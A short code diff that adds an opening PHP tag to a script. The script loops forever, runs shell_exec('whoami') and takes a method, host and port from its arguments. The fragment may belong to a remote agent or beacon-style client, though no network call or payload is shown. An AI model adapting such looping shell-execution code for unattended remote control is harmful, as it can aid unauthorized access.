@@ -1,6 +1,7 @@
 // usage:
 // php startscript.php script_name 127.0.0.1 42999
 // xxx $argv[0]        $argv[1]    $argv[2]  $argv[3]
+<?php
 while (1) {
 $username = explode(PHP_EOL, shell_exec("whoami"))[0];
 $method   = $argv[1];
